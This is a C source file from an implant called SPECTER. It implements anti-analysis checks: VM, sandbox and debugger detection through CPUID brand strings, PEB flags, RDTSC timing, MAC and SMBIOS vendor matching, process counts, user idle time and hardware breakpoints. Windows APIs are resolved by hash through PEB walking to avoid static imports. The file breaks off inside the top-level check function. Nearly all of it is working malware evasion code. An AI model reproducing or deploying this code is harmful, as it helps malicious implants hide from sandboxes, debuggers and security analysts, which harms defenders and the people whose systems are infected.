/**
 * SPECTER Implant — Anti-Analysis Countermeasures
 *
 * VM, sandbox, and debugger detection using CPUID, PEB inspection,
 * RDTSC timing, process enumeration, and hardware breakpoint checks.
 * All API calls resolved via PEB walking — no static imports.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "syscalls.h"
#include "antianalysis.h"

/* HASH_USER32_DLL defined in evasion.h — avoid including full header to
   prevent redefinition conflicts; reuse same value. */
#ifndef HASH_USER32_DLL
#define HASH_USER32_DLL     0x5E5AB823  /* "user32.dll" (from evasion.h) */
#endif

/* ------------------------------------------------------------------ */
/*  Test stubs — override hardware reads in test builds                */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
static DWORD g_test_cpuid_ecx_leaf1  = 0;
static DWORD g_test_cpuid_ebx_leaf40 = 0;
static DWORD g_test_cpuid_ecx_leaf40 = 0;
static DWORD g_test_cpuid_edx_leaf40 = 0;
static BYTE  g_test_peb_debugged     = 0;
static QWORD g_test_rdtsc_delta      = 0;
static DWORD g_test_process_count    = 100;
static QWORD g_test_dr0 = 0, g_test_dr1 = 0;
static QWORD g_test_dr2 = 0, g_test_dr3 = 0;

void aa_test_set_cpuid_result(DWORD ecx_leaf1, DWORD ebx_leaf40,
                               DWORD ecx_leaf40, DWORD edx_leaf40) {
    g_test_cpuid_ecx_leaf1  = ecx_leaf1;
    g_test_cpuid_ebx_leaf40 = ebx_leaf40;
    g_test_cpuid_ecx_leaf40 = ecx_leaf40;
    g_test_cpuid_edx_leaf40 = edx_leaf40;
}

void aa_test_set_peb_debugged(BYTE val) {
    g_test_peb_debugged = val;
}

void aa_test_set_rdtsc_delta(QWORD delta) {
    g_test_rdtsc_delta = delta;
}

void aa_test_set_process_count(DWORD count) {
    g_test_process_count = count;
}

void aa_test_set_debug_registers(QWORD dr0, QWORD dr1,
                                  QWORD dr2, QWORD dr3) {
    g_test_dr0 = dr0;
    g_test_dr1 = dr1;
    g_test_dr2 = dr2;
    g_test_dr3 = dr3;
}

static DWORD g_test_mac_prefix       = 0;
static BOOL  g_test_smbios_vm        = FALSE;
static DWORD g_test_recent_docs_count = 10;  /* Non-zero = has recent docs */

void aa_test_set_mac_prefix(DWORD prefix) {
    g_test_mac_prefix = prefix;
}

void aa_test_set_smbios_vm(BOOL is_vm) {
    g_test_smbios_vm = is_vm;
}

void aa_test_set_recent_docs_count(DWORD count) {
    g_test_recent_docs_count = count;
}
#endif /* TEST_BUILD */

/* ------------------------------------------------------------------ */
/*  Internal helpers                                                   */
/* ------------------------------------------------------------------ */

static void aa_add_indicator(ANALYSIS_RESULT *result, DWORD indicator) {
    if (result->indicator_count < AA_MAX_INDICATORS)
        result->indicators[result->indicator_count++] = indicator;
}

/* ------------------------------------------------------------------ */
/*  CPUID wrapper                                                      */
/* ------------------------------------------------------------------ */

#ifndef TEST_BUILD
static void aa_cpuid(DWORD leaf, DWORD *eax, DWORD *ebx,
                      DWORD *ecx, DWORD *edx) {
    __asm__ volatile (
        "cpuid"
        : "=a"(*eax), "=b"(*ebx), "=c"(*ecx), "=d"(*edx)
        : "a"(leaf), "c"(0)
    );
}
#endif

/* ------------------------------------------------------------------ */
/*  RDTSC wrapper                                                      */
/* ------------------------------------------------------------------ */

#ifndef TEST_BUILD
static QWORD aa_rdtsc(void) {
    DWORD lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((QWORD)hi << 32) | lo;
}
#endif

/* ------------------------------------------------------------------ */
/*  VM detection                                                       */
/* ------------------------------------------------------------------ */

/**
 * Check CPUID leaf 1 ECX bit 31 (hypervisor present) and leaf 0x40000000
 * for hypervisor brand string.  Known brands:
 *   "VMwareVMware" — VMware
 *   "Microsoft Hv" — Hyper-V
 *   "KVMKVMKVM\0\0\0" — KVM
 *   "VBoxVBoxVBox" — VirtualBox
 *   "TCGTCGTCGTCG" — QEMU/TCG
 */
static DWORD aa_check_cpuid_hypervisor(ANALYSIS_RESULT *result) {
    DWORD ebx = 0, ecx = 0, edx = 0;

#ifdef TEST_BUILD
    ecx = g_test_cpuid_ecx_leaf1;
#else
    DWORD eax = 0;
    aa_cpuid(1, &eax, &ebx, &ecx, &edx);
#endif

    if (!(ecx & CPUID_HYPERVISOR_BIT))
        return 0;

    /* Hypervisor bit is set — read brand string from leaf 0x40000000 */
#ifdef TEST_BUILD
    ebx = g_test_cpuid_ebx_leaf40;
    ecx = g_test_cpuid_ecx_leaf40;
    edx = g_test_cpuid_edx_leaf40;
#else
    aa_cpuid(0x40000000, &eax, &ebx, &ecx, &edx);
#endif

    /* Brand is 12 bytes in EBX:ECX:EDX */
    char brand[13];
    spec_memcpy(&brand[0], &ebx, 4);
    spec_memcpy(&brand[4], &ecx, 4);
    spec_memcpy(&brand[8], &edx, 4);
    brand[12] = '\0';

    /* Check known VM brand strings */
    if (spec_memcmp(brand, "VMwareVMware", 12) == 0 ||
        spec_memcmp(brand, "Microsoft Hv", 12) == 0 ||
        spec_memcmp(brand, "KVMKVMKVM\0\0\0", 12) == 0 ||
        spec_memcmp(brand, "VBoxVBoxVBox", 12) == 0 ||
        spec_memcmp(brand, "TCGTCGTCGTCG", 12) == 0) {
        aa_add_indicator(result, AA_IND_CPUID_HYPERVISOR);
        return 40;  /* High confidence from CPUID brand match */
    }

    /* Unknown hypervisor — still suspicious */
    aa_add_indicator(result, AA_IND_CPUID_HYPERVISOR);
    return 20;
}

/**
 * Check if any running processes match known VM tools.
 * Uses NtQuerySystemInformation to enumerate processes without
 * importing CreateToolhelp32Snapshot.
 */
static DWORD aa_check_vm_processes(IMPLANT_CONTEXT *ctx,
                                    ANALYSIS_RESULT *result) {
    (void)ctx;

    /* Known VM tool process name hashes */
    static const DWORD vm_proc_hashes[] = {
        HASH_VMTOOLSD_EXE,
        HASH_VMWARETRAY_EXE,
        HASH_VBOXSERVICE_EXE,
        HASH_VBOXTRAY_EXE,
        HASH_QEMU_GA_EXE,
    };
    static const DWORD vm_proc_count = sizeof(vm_proc_hashes) / sizeof(DWORD);

    /*
     * Process enumeration via NtQuerySystemInformation(SystemProcessInformation)
     * would require a large buffer and careful parsing.  For the PIC implant,
     * we use the PEB module list as a lightweight proxy — if VM tools DLLs
     * are loaded in our process space, that's a signal.  Full process
     * enumeration happens via the sandbox check's process count logic.
     *
     * Here we check for VM-specific modules loaded in our address space.
     */
    PPEB peb;
#ifdef TEST_BUILD
    /* In test builds, skip PEB walking */
    (void)vm_proc_hashes;
    (void)vm_proc_count;
    (void)peb;
    return 0;
#else
    peb = get_peb();
    if (!peb || !peb->Ldr)
        return 0;

    DWORD score = 0;
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)entry;
        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            DWORD hash = spec_djb2_hash_w(mod->BaseDllName.Buffer);
            for (DWORD i = 0; i < vm_proc_count; i++) {
                if (hash == vm_proc_hashes[i]) {
                    aa_add_indicator(result, AA_IND_VM_PROCESS);
                    score += 25;
                    break;
                }
            }
        }
        entry = entry->Flink;
    }

    return score > 40 ? 40 : score;
#endif
}

/**
 * MAC address prefix check: compare network adapter MAC OUI against
 * known VM MAC prefixes (VMware, VirtualBox, Hyper-V, QEMU, Xen, etc.).
 * Uses GetAdaptersInfo from iphlpapi.dll on real builds.
 */
static DWORD aa_check_mac_prefix(IMPLANT_CONTEXT *ctx,
                                  ANALYSIS_RESULT *result) {
    (void)ctx;
    DWORD mac_oui = 0;

#ifdef TEST_BUILD
    mac_oui = g_test_mac_prefix;
    if (mac_oui == 0)
        return 0;
#else
    /* Resolve GetAdaptersInfo from iphlpapi.dll */
    typedef struct _IP_ADAPTER_INFO_MINIMAL {
        struct _IP_ADAPTER_INFO_MINIMAL *Next;
        DWORD ComboIndex;
        char  AdapterName[260];
        char  Description[132];
        DWORD AddressLength;
        BYTE  Address[8];
        /* ... remaining fields not needed */
    } IP_ADAPTER_INFO_MINIMAL;

    typedef DWORD (*PFN_GETADAPTERSINFO)(IP_ADAPTER_INFO_MINIMAL *, ULONG *);

    PVOID iphlpapi = find_module_by_hash(HASH_IPHLPAPI_DLL);
    if (!iphlpapi) return 0;

    PFN_GETADAPTERSINFO pGetAdapters =
        (PFN_GETADAPTERSINFO)find_export_by_hash(iphlpapi, HASH_GETADAPTERSINFO);
    if (!pGetAdapters) return 0;

    /* Query required buffer size first, then use stack buffer */
    BYTE adapter_buf[1024];
    ULONG buf_len = sizeof(adapter_buf);
    DWORD err = pGetAdapters((IP_ADAPTER_INFO_MINIMAL *)adapter_buf, &buf_len);
    if (err != 0) return 0;

    IP_ADAPTER_INFO_MINIMAL *adapter = (IP_ADAPTER_INFO_MINIMAL *)adapter_buf;
    while (adapter) {
        if (adapter->AddressLength >= 3) {
            mac_oui = ((DWORD)adapter->Address[0] << 16) |
                      ((DWORD)adapter->Address[1] << 8)  |
                       (DWORD)adapter->Address[2];
            /* Check against any known OUI — break on first match */
            if (mac_oui == VM_MAC_VMWARE_1  || mac_oui == VM_MAC_VMWARE_2  ||
                mac_oui == VM_MAC_VMWARE_3  || mac_oui == VM_MAC_VBOX_1    ||
                mac_oui == VM_MAC_HYPERV_1  || mac_oui == VM_MAC_HYPERV_2  ||
                mac_oui == VM_MAC_QEMU_1    || mac_oui == VM_MAC_PARALLELS ||
                mac_oui == VM_MAC_XEN) {
                aa_add_indicator(result, AA_IND_VM_MAC_PREFIX);
                return 30;
            }
        }
        adapter = adapter->Next;
        /* Safety: don't follow Next pointers outside our buffer */
        if (adapter && ((BYTE *)adapter < adapter_buf ||
            (BYTE *)adapter >= adapter_buf + sizeof(adapter_buf)))
            break;
    }

    return 0;
#endif

    /* Test build path: check the injected OUI value */
#ifdef TEST_BUILD
    static const DWORD known_ouis[] = {
        VM_MAC_VMWARE_1, VM_MAC_VMWARE_2, VM_MAC_VMWARE_3,
        VM_MAC_VBOX_1,   VM_MAC_HYPERV_1, VM_MAC_HYPERV_2,
        VM_MAC_QEMU_1,   VM_MAC_PARALLELS, VM_MAC_XEN,
    };
    for (DWORD i = 0; i < sizeof(known_ouis) / sizeof(DWORD); i++) {
        if (mac_oui == known_ouis[i]) {
            aa_add_indicator(result, AA_IND_VM_MAC_PREFIX);
            return 30;
        }
    }
#endif

    return 0;
}

/**
 * SMBIOS firmware table check: query firmware tables for VM vendor
 * strings (VMware, VirtualBox, QEMU).  Uses GetSystemFirmwareTable
 * from kernel32.dll.
 */
static DWORD aa_check_smbios_firmware(IMPLANT_CONTEXT *ctx,
                                       ANALYSIS_RESULT *result) {
    (void)ctx;

#ifdef TEST_BUILD
    if (g_test_smbios_vm) {
        aa_add_indicator(result, AA_IND_SMBIOS_FIRMWARE);
        return 35;
    }
    return 0;
#else
    /* Resolve GetSystemFirmwareTable from kernel32.dll */
    typedef DWORD (*PFN_GETSYSFWTABLE)(DWORD, DWORD, PVOID, DWORD);

    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return 0;

    PFN_GETSYSFWTABLE pGetFW =
        (PFN_GETSYSFWTABLE)find_export_by_hash(k32, HASH_GETSYSFIRMWARETABLE);
    if (!pGetFW) return 0;

    /* Query RSMB (Raw SMBIOS) firmware table, provider 'RSMB' */
    #define RSMB_SIGNATURE 0x52534D42  /* 'RSMB' */

    /* First call to get required size */
    DWORD fw_size = pGetFW(RSMB_SIGNATURE, 0, NULL, 0);
    if (fw_size == 0 || fw_size > 4096)
        return 0;  /* Too large for stack — skip */

    BYTE fw_buf[4096];
    DWORD read = pGetFW(RSMB_SIGNATURE, 0, fw_buf, sizeof(fw_buf));
    if (read == 0)
        return 0;

    /* Search firmware data for known VM vendor strings */
    static const char *vm_strings[] = {
        "VMware", "VirtualBox", "QEMU", "Bochs", "Xen",
        "innotek", "Parallels", "Microsoft Corporation",
    };
    static const DWORD vm_string_count = 8;

    for (DWORD s = 0; s < vm_string_count; s++) {
        const char *needle = vm_strings[s];
        DWORD needle_len = spec_strlen(needle);
        if (needle_len == 0 || needle_len > read) continue;

        for (DWORD i = 0; i <= read - needle_len; i++) {
            if (spec_memcmp(fw_buf + i, needle, needle_len) == 0) {
                aa_add_indicator(result, AA_IND_SMBIOS_FIRMWARE);
                return 35;
            }
        }
    }

    return 0;
#endif
}

DWORD antianalysis_check_vm(IMPLANT_CONTEXT *ctx, ANALYSIS_RESULT *result) {
    DWORD confidence = 0;

    /* CPUID hypervisor detection */
    confidence += aa_check_cpuid_hypervisor(result);

    /* VM tools process/module detection */
    confidence += aa_check_vm_processes(ctx, result);

    /* MAC address OUI prefix check */
    confidence += aa_check_mac_prefix(ctx, result);

    /* SMBIOS firmware table strings */
    confidence += aa_check_smbios_firmware(ctx, result);

    /* Cap at 100 */
    if (confidence > 100)
        confidence = 100;

    return confidence;
}

/* ------------------------------------------------------------------ */
/*  Sandbox detection                                                  */
/* ------------------------------------------------------------------ */

/**
 * Timing acceleration check: measure RDTSC delta across a known
 * computation.  Sandboxes often accelerate time, causing the delta
 * to be suspiciously large relative to wall-clock time.
 */
static DWORD aa_check_timing(ANALYSIS_RESULT *result) {
    QWORD delta;

#ifdef TEST_BUILD
    delta = g_test_rdtsc_delta;
#else
    QWORD start = aa_rdtsc();

    /* Perform a known computation — ~1000 iterations of simple work */
    volatile DWORD dummy = 0;
    for (DWORD i = 0; i < 1000; i++)
        dummy += i * i;
    (void)dummy;

    QWORD end = aa_rdtsc();
    delta = end - start;
#endif

    /* If delta is suspiciously large, time may be accelerated */
    if (delta > AA_RDTSC_THRESHOLD) {
        aa_add_indicator(result, AA_IND_TIMING_ACCEL);
        return 25;
    }

    return 0;
}

/**
 * Process count check: sandboxes typically have very few processes.
 * Uses NtQuerySystemInformation(SystemProcessInformation = 5).
 */
static DWORD aa_check_process_count(IMPLANT_CONTEXT *ctx,
                                     ANALYSIS_RESULT *result) {
    (void)ctx;
    DWORD count = 0;

#ifdef TEST_BUILD
    count = g_test_process_count;
#else
    /* NtQuerySystemInformation with SystemProcessInformation (5)
     * Walk the linked list of SYSTEM_PROCESS_INFORMATION entries.
     * Each entry has NextEntryOffset; last entry has offset = 0. */

    /* Resolve NtQuerySystemInformation */
    typedef NTSTATUS (*PFN_NTQSI)(ULONG, PVOID, ULONG, PULONG);
    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return 0;

    /* DJB2 of "NtQuerySystemInformation" */
    #define HASH_NTQSI 0x7BC23B49
    PFN_NTQSI pNtQSI = (PFN_NTQSI)find_export_by_hash(ntdll, HASH_NTQSI);
    if (!pNtQSI) return 0;

    /* Allocate buffer for process list — 256KB should suffice */
    #define PROC_BUF_SIZE (256 * 1024)
    BYTE proc_buf[1024];  /* Stack-based small check — just count entries */

    /* Use a reasonable stack buffer to read partial data and count.
     * For PIC code, we avoid large stack allocations.  Instead, use
     * a heap-free approach: call with small buffer, parse what we can,
     * and if STATUS_INFO_LENGTH_MISMATCH, estimate count as "many". */
    ULONG ret_len = 0;
    NTSTATUS status = pNtQSI(5, proc_buf, sizeof(proc_buf), &ret_len);

    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        /* Buffer too small means there are many processes — not a sandbox */
        count = 100;
    } else if (NT_SUCCESS(status)) {
        /* Count entries by walking NextEntryOffset */
        BYTE *ptr = proc_buf;
        while (1) {
            count++;
            DWORD next_offset = *(DWORD *)ptr;  /* NextEntryOffset at offset 0 */
            if (next_offset == 0) break;
            ptr += next_offset;
            if (ptr >= proc_buf + sizeof(proc_buf)) break;
        }
    }
#endif

    if (count > 0 && count < AA_MIN_PROCESS_COUNT) {
        aa_add_indicator(result, AA_IND_LOW_PROC_COUNT);
        return 30;
    }

    return 0;
}

/**
 * User interaction check: use GetLastInputInfo to determine if there
 * has been recent user activity.  Sandboxes often have no input.
 */
static DWORD aa_check_user_input(IMPLANT_CONTEXT *ctx,
                                  ANALYSIS_RESULT *result) {
    (void)ctx;

#ifdef TEST_BUILD
    /* In test builds, assume user input is present */
    return 0;
#else
    /* Resolve GetLastInputInfo from user32.dll */
    typedef struct _LASTINPUTINFO {
        DWORD cbSize;
        DWORD dwTime;
    } LASTINPUTINFO;

    typedef BOOL (*PFN_GETLASTINPUTINFO)(LASTINPUTINFO *);
    typedef DWORD (*PFN_GETTICKCOUNT)(void);

    PVOID user32 = find_module_by_hash(HASH_USER32_DLL);
    if (!user32) return 0;  /* user32 not loaded — can't check */

    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return 0;

    /* DJB2 hashes */
    #define HASH_GETLASTINPUTINFO  0xA4B2C1D0
    #define HASH_GETTICKCOUNT      0xB5C3D2E1

    PFN_GETLASTINPUTINFO pGetLastInput =
        (PFN_GETLASTINPUTINFO)find_export_by_hash(user32, HASH_GETLASTINPUTINFO);
    PFN_GETTICKCOUNT pGetTickCount =
        (PFN_GETTICKCOUNT)find_export_by_hash(k32, HASH_GETTICKCOUNT);

    if (!pGetLastInput || !pGetTickCount)
        return 0;

    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (!pGetLastInput(&lii))
        return 0;

    DWORD now = pGetTickCount();
    DWORD idle_time = now - lii.dwTime;

    if (idle_time > AA_USER_INPUT_TIMEOUT) {
        aa_add_indicator(result, AA_IND_NO_USER_INPUT);
        return 20;
    }

    return 0;
#endif
}

/**
 * Screen resolution check: sandboxes often use minimal resolutions.
 */
static DWORD aa_check_screen_resolution(IMPLANT_CONTEXT *ctx,
                                         ANALYSIS_RESULT *result) {
    (void)ctx;

#ifdef TEST_BUILD
    return 0;
#else
    /* Resolve GetSystemMetrics from user32.dll */
    typedef int (*PFN_GETSYSTEMMETRICS)(int);

    PVOID user32 = find_module_by_hash(HASH_USER32_DLL);
    if (!user32) return 0;

    #define HASH_GETSYSTEMMETRICS  0xC6D4E3F2
    #define SM_CXSCREEN 0
    #define SM_CYSCREEN 1

    PFN_GETSYSTEMMETRICS pGetSM =
        (PFN_GETSYSTEMMETRICS)find_export_by_hash(user32, HASH_GETSYSTEMMETRICS);
    if (!pGetSM) return 0;

    int width = pGetSM(SM_CXSCREEN);
    int height = pGetSM(SM_CYSCREEN);

    if (width < AA_MIN_SCREEN_WIDTH || height < AA_MIN_SCREEN_HEIGHT) {
        aa_add_indicator(result, AA_IND_LOW_RESOLUTION);
        return 15;
    }

    return 0;
#endif
}

/**
 * Check for analysis tool processes by scanning loaded modules.
 */
static DWORD aa_check_analysis_tools(IMPLANT_CONTEXT *ctx,
                                      ANALYSIS_RESULT *result) {
    (void)ctx;

#ifdef TEST_BUILD
    return 0;
#else
    static const DWORD tool_hashes[] = {
        HASH_WIRESHARK_EXE,
        HASH_PROCMON_EXE,
        HASH_X64DBG_EXE,
        HASH_X32DBG_EXE,
        HASH_IDA64_EXE,
        HASH_OLLYDBG_EXE,
        HASH_PROCESSHACKER_EXE,
    };
    static const DWORD tool_count = sizeof(tool_hashes) / sizeof(DWORD);

    PPEB peb = get_peb();
    if (!peb || !peb->Ldr) return 0;

    DWORD score = 0;
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)entry;
        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            DWORD hash = spec_djb2_hash_w(mod->BaseDllName.Buffer);
            for (DWORD i = 0; i < tool_count; i++) {
                if (hash == tool_hashes[i]) {
                    aa_add_indicator(result, AA_IND_ANALYSIS_ARTIFACT);
                    score += 30;
                    break;
                }
            }
        }
        entry = entry->Flink;
    }

    return score > 40 ? 40 : score;
#endif
}

/**
 * Recent documents check: sandboxes and fresh VMs typically have no
 * recent documents.  Check if the Recent folder has any entries.
 */
static DWORD aa_check_recent_docs(IMPLANT_CONTEXT *ctx,
                                   ANALYSIS_RESULT *result) {
    (void)ctx;

#ifdef TEST_BUILD
    if (g_test_recent_docs_count == 0) {
        aa_add_indicator(result, AA_IND_EMPTY_RECENT_DOCS);
        return 15;
    }
    return 0;
#else
    /*
     * Use SHGetFolderPathA(CSIDL_RECENT) to get the Recent folder path,
     * then FindFirstFileA to check for entries.  If the folder is empty
     * or inaccessible, it's a sandbox signal.
     */
    typedef int (*PFN_SHGETFOLDERPATH)(PVOID, int, PVOID, DWORD, char *);

    /* WIN32_FIND_DATAA — simplified, we only need the first entry */
    typedef struct _FIND_DATA_MINIMAL {
        DWORD dwFileAttributes;
        BYTE  _pad[36];  /* ftCreationTime, ftLastAccessTime, ftLastWriteTime */
        DWORD nFileSizeHigh;
        DWORD nFileSizeLow;
        DWORD dwReserved0;
        DWORD dwReserved1;
        char  cFileName[260];
        char  cAlternateFileName[14];
    } FIND_DATA_MINIMAL;

    typedef PVOID (*PFN_FINDFIRSTFILE)(const char *, FIND_DATA_MINIMAL *);
    typedef BOOL (*PFN_FINDCLOSE)(PVOID);

    PVOID shell32 = find_module_by_hash(HASH_SHELL32_DLL);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!shell32 || !k32) return 0;

    PFN_SHGETFOLDERPATH pSHGetPath =
        (PFN_SHGETFOLDERPATH)find_export_by_hash(shell32, HASH_SHGETFOLDERPATH);
    PFN_FINDFIRSTFILE pFindFirst =
        (PFN_FINDFIRSTFILE)find_export_by_hash(k32, HASH_FINDFIRSTFILE);
    PFN_FINDCLOSE pFindClose =
        (PFN_FINDCLOSE)find_export_by_hash(k32, HASH_FINDCLOSE);

    if (!pSHGetPath || !pFindFirst || !pFindClose)
        return 0;

    /* CSIDL_RECENT = 0x0008, SHGFP_TYPE_CURRENT = 0 */
    #define CSIDL_RECENT 0x0008
    char recent_path[260];
    if (pSHGetPath(NULL, CSIDL_RECENT, NULL, 0, recent_path) != 0)
        return 0;

    /* Append wildcard for FindFirstFile */
    DWORD path_len = spec_strlen(recent_path);
    if (path_len + 3 >= sizeof(recent_path))
        return 0;
    recent_path[path_len]     = '\\';
    recent_path[path_len + 1] = '*';
    recent_path[path_len + 2] = '\0';

    FIND_DATA_MINIMAL fd;
    spec_memset(&fd, 0, sizeof(fd));
    PVOID hFind = pFindFirst(recent_path, &fd);

    #define INVALID_HANDLE_VALUE_AA ((PVOID)(ULONG_PTR)-1)
    if (hFind == INVALID_HANDLE_VALUE_AA || hFind == NULL) {
        aa_add_indicator(result, AA_IND_EMPTY_RECENT_DOCS);
        return 15;
    }

    /* Found at least one entry — check if it's just "." or ".." */
    BOOL has_real_file = FALSE;
    if (fd.cFileName[0] != '.' ||
        (fd.cFileName[1] != '\0' && fd.cFileName[1] != '.'))
        has_real_file = TRUE;

    pFindClose(hFind);

    if (!has_real_file) {
        aa_add_indicator(result, AA_IND_EMPTY_RECENT_DOCS);
        return 15;
    }

    return 0;
#endif
}

DWORD antianalysis_check_sandbox(IMPLANT_CONTEXT *ctx,
                                  ANALYSIS_RESULT *result) {
    DWORD confidence = 0;

    confidence += aa_check_timing(result);
    confidence += aa_check_process_count(ctx, result);
    confidence += aa_check_user_input(ctx, result);
    confidence += aa_check_screen_resolution(ctx, result);
    confidence += aa_check_analysis_tools(ctx, result);
    confidence += aa_check_recent_docs(ctx, result);

    if (confidence > 100)
        confidence = 100;

    return confidence;
}

/* ------------------------------------------------------------------ */
/*  Debugger detection                                                 */
/* ------------------------------------------------------------------ */

/**
 * PEB->BeingDebugged flag check.
 */
static DWORD aa_check_peb_debugged(ANALYSIS_RESULT *result) {
    BYTE debugged;

#ifdef TEST_BUILD
    debugged = g_test_peb_debugged;
#else
    PPEB peb = get_peb();
    if (!peb) return 0;
    debugged = peb->BeingDebugged;
#endif

    if (debugged) {
        aa_add_indicator(result, AA_IND_PEB_DEBUGGED);
        return 50;  /* Very high confidence — direct flag */
    }

    return 0;
}

/**
 * NtQueryInformationProcess with ProcessDebugPort (7).
 * If debug port is non-zero, a debugger is attached.
 */
static DWORD aa_check_debug_port(IMPLANT_CONTEXT *ctx,
                                  ANALYSIS_RESULT *result) {
    (void)ctx;

#ifdef TEST_BUILD
    return 0;
#else
    typedef NTSTATUS (*PFN_NTQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);

    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return 0;

    /* HASH_NTQUERYINFORMATIONPROCESS provided by syscalls.h */
    #define PROCESS_DEBUG_PORT 7

    PFN_NTQIP pNtQIP = (PFN_NTQIP)find_export_by_hash(ntdll,
                            HASH_NTQUERYINFORMATIONPROCESS);
    if (!pNtQIP) return 0;

    ULONG_PTR debug_port = 0;
    NTSTATUS status = pNtQIP((HANDLE)(ULONG_PTR)-1, PROCESS_DEBUG_PORT,
                              &debug_port, sizeof(debug_port), NULL);

    if (NT_SUCCESS(status) && debug_port != 0) {
        aa_add_indicator(result, AA_IND_DEBUG_PORT);
        return 40;
    }

    return 0;
#endif
}

/**
 * RDTSC timing delta: execute RDTSC twice with minimal work between.
 * A debugger single-stepping will produce an anomalously large delta.
 */
static DWORD aa_check_rdtsc_timing(ANALYSIS_RESULT *result) {
    QWORD delta;

#ifdef TEST_BUILD
    delta = g_test_rdtsc_delta;
#else
    QWORD t1 = aa_rdtsc();

    /* Minimal work — just a few NOPs to prevent optimization */
    __asm__ volatile ("nop\n\tnop\n\tnop\n\tnop");

    QWORD t2 = aa_rdtsc();
    delta = t2 - t1;
#endif

    /* Single-stepping through this code would yield a very large delta */
    if (delta > AA_RDTSC_THRESHOLD) {
        aa_add_indicator(result, AA_IND_RDTSC_DELTA);
        return 30;
    }

    return 0;
}

/**
 * Hardware breakpoint detection: read DR0–DR3 via GetThreadContext
 * or inline assembly.  Non-zero values indicate hardware breakpoints.
 */
static DWORD aa_check_hw_breakpoints(IMPLANT_CONTEXT *ctx,
                                      ANALYSIS_RESULT *result) {
    (void)ctx;
    QWORD dr0 = 0, dr1 = 0, dr2 = 0, dr3 = 0;

#ifdef TEST_BUILD
    dr0 = g_test_dr0;
    dr1 = g_test_dr1;
    dr2 = g_test_dr2;
    dr3 = g_test_dr3;
#else
    /* Use NtGetContextThread to read debug registers.
     * Resolve from ntdll and call with current thread handle (-2). */
    typedef struct _CONTEXT_PARTIAL {
        DWORD ContextFlags;
        BYTE  _pad[40];     /* Offset to debug registers varies by flags */
        QWORD Dr0;
        QWORD Dr1;
        QWORD Dr2;
        QWORD Dr3;
        QWORD Dr6;
        QWORD Dr7;
    } CONTEXT_PARTIAL;

    typedef NTSTATUS (*PFN_NTGETCTX)(HANDLE, CONTEXT_PARTIAL *);

    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return 0;

    #define HASH_NTGETCONTEXTTHREAD 0xD45BC103
    #define CONTEXT_DEBUG_REGISTERS 0x00100010  /* CONTEXT_AMD64 | DEBUG_REGISTERS */

    PFN_NTGETCTX pNtGetCtx =
        (PFN_NTGETCTX)find_export_by_hash(ntdll, HASH_NTGETCONTEXTTHREAD);
    if (!pNtGetCtx) return 0;

    CONTEXT_PARTIAL ctx_buf;
    spec_memset(&ctx_buf, 0, sizeof(ctx_buf));
    ctx_buf.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    /* Current thread pseudo-handle = -2 */
    NTSTATUS status = pNtGetCtx((HANDLE)(ULONG_PTR)-2, &ctx_buf);
    if (!NT_SUCCESS(status)) return 0;

    dr0 = ctx_buf.Dr0;
    dr1 = ctx_buf.Dr1;
    dr2 = ctx_buf.Dr2;
    dr3 = ctx_buf.Dr3;
#endif

    if (dr0 || dr1 || dr2 || dr3) {
        aa_add_indicator(result, AA_IND_HW_BREAKPOINTS);
        return 35;
    }

    return 0;
}

DWORD antianalysis_check_debugger(IMPLANT_CONTEXT *ctx,
                                   ANALYSIS_RESULT *result) {
    DWORD confidence = 0;

    confidence += aa_check_peb_debugged(result);
    confidence += aa_check_debug_port(ctx, result);
    confidence += aa_check_rdtsc_timing(result);
    confidence += aa_check_hw_breakpoints(ctx, result);

    if (confidence > 100)
        confidence = 100;

    return confidence;
}

/* ------------------------------------------------------------------ */
/*  Top-level check orchestrator                                       */
/* ------------------------------------------------------------------ */

ANALYSIS_TYPE antianalysis_check(IMPLANT_CONTEXT *ctx,
                                  const ANTIANALYSIS_CONFIG *cfg,
                                  ANALYSIS_RESULT *result) {
    if (!ctx || !cfg || !result)
        return ANALYSIS_CLEAN;

    spec_memset(result, 0, sizeof(ANALYSIS_RESULT));
    result->type = ANALYSIS_CLEAN;

    /* Debugger checks first — highest signal, fastest */
    if (cfg->check_debugger) {
        ANALYSIS_RESULT dbg_result;
        spec_memset(&dbg_result, 0, sizeof(ANALYSIS_RESULT));
        DWORD dbg_conf = antianalysis_check_debugger(ctx, &dbg_result);

        if (dbg_conf >= cfg->dbg_threshold) {
            result->type = ANALYSIS_DEBUGGER;
            result->confidence = dbg_conf;
            result->indicator_count = dbg_result.indicator_count;
            spec_memcpy(result->indicators, dbg_result.indicators,
                        sizeof(DWORD) * dbg_result.indicator_count);
            return ANALYSIS_DEBUGGER;
        }
    }

    /* VM detection */
    if (cfg->check_vm) {
        ANALYSIS_RESULT vm_result;
        spec_memset(&vm_result, 0, sizeof(ANALYSIS_RESULT));
        DWORD vm_conf = antianalysis_check_vm(ctx, &vm_result);

        if (vm_conf >= cfg->vm_threshold) {
            result->type = ANALYSIS_VM;
            result->confidence = vm_conf;
            result->indicator_count = vm_result.indicator_count;
            spec_memcpy(result->indicators, vm_result.indicators,
                        sizeof(DWORD) * vm_result.indicator_count);
            return ANALYSIS_VM;
        }
    }

    /* Sandbox detection */
    if (cfg->check_sandbox) {
